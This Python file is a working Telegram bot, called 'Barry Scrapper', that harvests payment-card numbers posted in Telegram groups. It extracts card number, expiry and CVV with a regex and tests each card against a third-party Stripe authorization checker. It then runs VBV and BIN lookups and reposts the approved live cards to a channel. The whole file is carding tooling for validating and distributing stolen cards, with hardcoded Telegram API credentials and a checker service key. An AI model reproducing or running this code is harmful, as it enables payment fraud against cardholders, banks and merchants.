import re
import asyncio
import httpx
import random
import time
from telethon import TelegramClient, events

# Telegram Config
api_id = 22092598
api_hash = "93de73c78293c85fd6feddb92f91b81a"
session_name = "cc_scraper"

group_ids = [-1002410570317]
channel_id = -1002404197649

client = TelegramClient(session_name, api_id, api_hash)

gate_names = ["Stripe Auth API"]
proxy_emojis = ["☁️", "⚡", "✨", "☀️", "🌧️", "❄️"]

cc_pattern = re.compile(r'(\d{13,16})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})')

def format_cc(match):
    cc, mm, yy, cvv = match.groups()
    yy = yy[-2:]
    return f"{cc}|{mm}|{yy}|{cvv}"

async def stripe_check(cc_details):
    url = f"https://barryxapi.xyz/stripe_auth?key=BRY-FGKD5-MDYRI-56HDM&card={cc_details}"
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(url, timeout=20)

            if "application/json" not in response.headers.get("content-type", ""):
                print("❌ Invalid content type:", response.headers.get("content-type", "N/A"))
                print("❌ Raw response:", response.text)
                return {"status": "❌ Invalid response (not JSON)"}

            data = response.json()

            result = data.get("result")
            if result and isinstance(result, dict):
                message = result.get("message")
                if message:
                    return {"status": message}
                else:
                    print("❌ Missing 'message' in result:", result)
                    return {"status": "❌ No message in result"}
            else:
                print("❌ No 'result' field or not a dict:", data)
                return {"status": "❌ Malformed API structure"}
    except Exception as e:
        return {"status": f"❌ API Error: {str(e)}"}

async def vbv_check(cc_details):
    try:
        url = "https://api.voidapi.xyz/v2/vbv"
        headers = {"User-Agent": "Mozilla/5.0"}
        params = {"card": cc_details}
        async with httpx.AsyncClient() as client:
            response = await client.get(url, headers=headers, params=params, timeout=10)
            data = response.json()
            return data.get("vbv_status", "❌ VBV Check Failed")
    except Exception as e:
        return f"❌ VBV Error: {str(e)}"

async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    async with httpx.AsyncClient() as client:
        try:
            response = await client.get(url, timeout=10)
            data = response.json()
            return {
                "country": data.get("country_name", "Unknown"),
                "flag": data.get("country_flag", "🏳"),
                "bank": data.get("bank", "Unknown"),
                "type": data.get("type", "Unknown"),
                "brand": data.get("brand", "Unknown")
            }
        except:
            return {
                "country": "Unknown",
                "flag": "🏳",
                "bank": "Unknown",
                "type": "Unknown",
                "brand": "Unknown"
            }

sent_ccs = set()

async def fast_scraper(event):
    if event.chat_id not in group_ids:
        return
    try:
        text = event.raw_text
        found_ccs = set()
        text = re.sub(r"[^\d\s|/-]", "", text)
        for match in cc_pattern.finditer(text):
            formatted_cc = format_cc(match)
            found_ccs.add(formatted_cc)

        if found_ccs:
            for cc in found_ccs:
                if cc in sent_ccs:
                    print(f"[SKIPPED] Already checked: {cc}")
                    continue

                sent_ccs.add(cc)
                result = await stripe_check(cc)
                print("Stripe Result:", result)

                if any(word in result["status"].upper() for word in ["APPROVED", "ADDED"]):
                    start_time = time.time()
                    vbv_status = await vbv_check(cc)
                    bin_info = await get_bin_info(cc[:6])
                    end_time = time.time()
                    time_taken = round(end_time - start_time, 2)

                    gate = random.choice(gate_names)
                    proxy_emoji = random.choice(proxy_emojis)

                    message = f"""
[ϟ] 𝗕𝗮𝗿𝗿𝘆 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿 | [$scr]

𝗦𝘁𝗮𝘁𝘂𝘀 - Process Completed
━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 - <code>{cc}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {result["status"]}
[ϟ] 𝗚𝗮𝘁𝗲 - {gate}
━━━━━━━━━━━━━
[ϟ] 𝗩𝗕𝗩 - {vbv_status}
━━━━━━━━━━━━━
[ϟ] 𝗕𝗶𝗻 : <code>{cc[:6]}</code>
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : <code>{bin_info['country']} {bin_info['flag']}</code>
[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : <code>{bin_info['bank']}</code>
[ϟ] 𝗧𝘆𝗽𝗲 : <code>{bin_info['type']} - {bin_info['brand']}</code>
━━━━━━━━━━━━━
[ϟ] T/t : {time_taken} sec | Proxy : Live {proxy_emoji}
[ϟ] 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗱 𝗕𝘆 : <a href="https://t.me/BarryxScrapper">𝗕𝗮𝗿𝗿𝘆</a>
"""
                    await client.send_message(channel_id, message, parse_mode="HTML")
                else:
                    print(f"❌ Skipped Declined: {cc} | {result['status']}")
    except Exception as e:
        print(f"[ERROR] Scraper crashed: {e}")

async def run_forever():
    while True:
        try:
            client.add_event_handler(fast_scraper, events.NewMessage())
            await client.start()
            print("✅ Scraper Running...")
            await client.run_until_disconnected()
        except Exception as e:
            import traceback
            print(f"[RESTARTING] due to error: {e}")
            traceback.print_exc()
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(run_forever())
